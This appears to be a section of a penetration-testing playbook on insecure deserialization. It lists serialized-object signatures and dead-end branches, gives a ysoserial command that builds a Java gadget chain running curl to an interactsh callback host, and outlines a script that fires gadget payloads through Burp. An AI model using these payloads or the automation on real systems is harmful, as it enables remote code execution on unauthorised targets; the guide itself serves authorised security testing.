## Insecure Deserialization

- `->` **[Primary Probe]** Identify serialized object formats in cookies, hidden fields, API bodies:
  - Java: `rO0AB` (base64 of `\xAC\xED`)
  - PHP: `O:8:"stdClass":`
  - Python Pickle: `\x80\x02`
  - .NET: `AAEAAAD/////`
  - `->` **[Signal: Object structure confirmed]** → Generate gadget chains with `ysoserial.net` / `PHPGGC` / `ysoserial` (Java): `java -jar ysoserial.jar CommonsCollections6 "curl https://interactsh"` [ijmir](https://www.ijmir.com/v2i6/2.php)
  - `->` **[Dead End: Serialized object signature-verified]** → Look for secondary deserialization: objects stored server-side (session store, cache) and retrieved via controllable key
  - `->` **[Dead End: No known gadget chains]** → Fuzzing: corrupt byte positions in serialized blob; observe if different exception classes leak in errors — different classes = different gadget candidates
  - `->` **[Dead End: Black-box only]** → OOB confirmation: embed DNS lookup gadget; monitor interactsh for callback confirming deserialization execution path [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11376817/)

**Script Definition Block — Java Gadget Automation:**
- **Input:** Base64-encoded Java serialized token from HTTP response
- **Core Logic:**
  1. Decode token, detect magic bytes `0xACED`
  2. Iterate through `ysoserial` gadget list: `CommonsCollections1–7`, `Spring1`, `Groovy1`
  3. For each: generate payload with OOB callback command
  4. Re-encode, inject into original request, fire via Burp Repeater
  5. Monitor interactsh for which gadget triggers DNS callback
- **Dependencies:** Java 8 runtime, ysoserial.jar, interactsh-client
- **Expected Output:** Gadget name + confirmed OOB callback + exploitable request template

***
